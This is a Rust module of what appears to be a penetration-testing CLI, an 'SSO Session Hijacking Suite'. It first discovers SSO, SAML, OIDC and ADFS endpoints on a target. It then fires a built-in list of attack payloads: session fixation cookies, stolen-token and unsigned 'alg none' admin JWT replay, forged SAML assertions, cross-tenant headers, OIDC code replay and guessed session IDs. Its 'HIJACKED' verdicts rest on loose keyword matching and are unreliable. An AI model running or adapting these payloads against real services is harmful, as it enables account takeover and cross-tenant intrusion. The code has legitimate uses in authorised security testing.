use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const SSO_ENDPOINTS: &[(&str, &str)] = &[
    ("SSO login", "/sso/login"),
    ("SSO callback", "/sso/callback"),
    ("SAML ACS", "/saml/acs"),
    ("SAML SLO", "/saml/slo"),
    ("SAML metadata", "/saml/metadata"),
    ("OIDC authorize", "/oauth2/authorize"),
    ("OIDC callback", "/oauth2/callback"),
    ("Token endpoint", "/oauth2/token"),
    ("Session check", "/api/session"),
    ("Refresh session", "/api/session/refresh"),
    ("Logout", "/sso/logout"),
    ("Tenant switch", "/sso/tenant/switch"),
    ("Federation metadata", "/federationmetadata"),
    ("ADFS", "/adfs/ls"),
    ("WS-Fed", "/wsfed"),
];

const HIJACK_PAYLOADS: &[(&str, &str, &str)] = &[
    (
        "Session fixation — set cookie",
        "GET",
        "Cookie: SESSIONID=attacker_session_12345",
    ),
    (
        "Session fixation — set via param",
        "GET",
        "?session=attacker_session_12345",
    ),
    (
        "Token replay — Bearer",
        "GET",
        "Authorization: Bearer stolen_token_value",
    ),
    (
        "Token replay — X-Auth-Token",
        "GET",
        "X-Auth-Token: stolen_token_value",
    ),
    ("Cross-tenant access", "GET", "X-Tenant-ID: target_tenant"),
    (
        "Cross-tenant via header",
        "GET",
        "X-Forwarded-Tenant: target_tenant",
    ),
    (
        "Cross-tenant via path",
        "GET",
        "X-Original-URL: /target_tenant/admin",
    ),
    (
        "SAML response replay",
        "POST",
        "SAMLResponse=PHNhbWxwOlJlc3BvbnNl",
    ),
    (
        "SAML assertion injection",
        "POST",
        "SAMLResponse=base64_forged_assertion",
    ),
    (
        "OIDC code replay",
        "GET",
        "?code=stolen_auth_code&state=test",
    ),
    (
        "OIDC token injection",
        "POST",
        "access_token=stolen_token&token_type=Bearer",
    ),
    ("Session token in URL", "GET", "?token=stolen_session_token"),
    (
        "JWT replay",
        "GET",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
    ),
    (
        "Refresh token abuse",
        "POST",
        "refresh_token=stolen_refresh&grant_type=refresh_token",
    ),
    (
        "WS-Fed token replay",
        "GET",
        "?wa=wsignin1.0&wresult=stolen_token",
    ),
    ("ADFS token replay", "POST", "wresult=stoken_adfs_token"),
    ("Session prediction", "GET", "Cookie: SESSIONID=0000000001"),
    (
        "Session prediction — admin",
        "GET",
        "Cookie: SESSIONID=admin",
    ),
];

pub async fn hijack(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} SSO Session Hijacking Suite", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!("\n{} [1/2] SSO endpoint discovery...", "[*]".cyan().bold());
    let mut found = Vec::new();
    for (name, path) in SSO_ENDPOINTS {
        let full_url = format!("{}{}", base, path);
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200 || status == 302;
                let has_sso = body.contains("saml")
                    || body.contains("oauth")
                    || body.contains("openid")
                    || body.contains("login")
                    || body.contains("session")
                    || body.contains("token");
                let tag = if accessible {
                    if has_sso {
                        "SSO PAGE".green().bold().to_string()
                    } else {
                        "accessible".green().to_string()
                    }
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:25} {:35} {}", "*".cyan(), name, path, tag);
                if accessible {
                    found.push((*name, body.chars().take(200).collect::<String>()));
                }
            }
            Err(_) => {
                println!("  {} {:25} {:35} error", "*".red(), name, path);
            }
        }
    }

    println!(
        "\n{} [2/2] Session hijacking payloads...",
        "[*]".cyan().bold()
    );
    println!(
        "  {} Testing {} hijack vectors...",
        "*".cyan(),
        HIJACK_PAYLOADS.len()
    );
    let mut results = Vec::new();

    for (name, method, header_value) in HIJACK_PAYLOADS {
        let test_url = format!("{}/api/session", base);
        let mut req = if *method == "POST" {
            client
                .post(&test_url)
                .header("Content-Type", "application/x-www-form-urlencoded")
                .body(header_value.to_string())
        } else {
            let url_with_param = if header_value.starts_with("?") {
                format!("{}{}", test_url, header_value)
            } else if header_value.starts_with("Cookie:") {
                test_url.clone()
            } else {
                test_url.clone()
            };
            client.get(&url_with_param)
        };

        if header_value.starts_with("Cookie:") {
            req = req.header("Cookie", &header_value[7..]);
        } else if header_value.starts_with("Authorization:") {
            req = req.header("Authorization", &header_value[15..]);
        } else if header_value.starts_with("X-") {
            let parts: Vec<&str> = header_value.splitn(2, ':').collect();
            if parts.len() == 2 {
                req = req.header(parts[0], parts[1].trim());
            }
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let set_cookie = resp.headers().get("set-cookie").is_some();
                let body = resp.text().await.unwrap_or_default();
                let has_session =
                    body.contains("session") || body.contains("token") || body.contains("user");
                let has_admin =
                    body.contains("admin") || body.contains("role") || body.contains("privilege");
                let has_error = body.contains("error")
                    || body.contains("invalid")
                    || body.contains("unauthorized");

                let tag = if (has_session || has_admin) && !has_error {
                    "HIJACKED".red().bold().to_string()
                } else if set_cookie && status == 200 {
                    "session set".yellow().to_string()
                } else if has_error || status == 401 || status == 403 {
                    "blocked".green().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:40} status={} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    status,
                    tag
                );

                if (has_session || has_admin) && !has_error {
                    println!(
                        "    {} {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                    results.push(*name);
                }
            }
            Err(_) => {
                println!(
                    "  {} [{:02}] {:40} error",
                    "*".red(),
                    results.len() + 1,
                    name
                );
            }
        }
    }

    println!(
        "\n{} {} SSO endpoints found, {} / {} hijack vectors succeeded",
        "[*]".cyan().bold(),
        found.len(),
        results.len(),
        HIJACK_PAYLOADS.len()
    );

    if !results.is_empty() {
        let fixation = results.iter().any(|n| n.contains("fixation"));
        let replay = results
            .iter()
            .any(|n| n.contains("replay") || n.contains("Replay"));
        let cross_tenant = results
            .iter()
            .any(|n| n.contains("tenant") || n.contains("Tenant"));
        let prediction = results
            .iter()
            .any(|n| n.contains("prediction") || n.contains("Prediction"));
        if fixation {
            println!(
                "{} [CRITICAL] Session fixation — attacker-controlled session accepted!",
                "[!]".red().bold()
            );
        }
        if replay {
            println!(
                "{} [CRITICAL] Token replay — stolen tokens accepted!",
                "[!]".red().bold()
            );
        }
        if cross_tenant {
            println!(
                "{} [HIGH] Cross-tenant access — lateral movement between tenants!",
                "[!]".red().bold()
            );
        }
        if prediction {
            println!(
                "{} [MEDIUM] Session prediction — predictable session IDs!",
                "[!]".yellow().bold()
            );
        }
    } else {
        println!(
            "{} No SSO hijacking vulnerabilities detected.",
            "[-]".green().bold()
        );
    }

    Ok(())
}
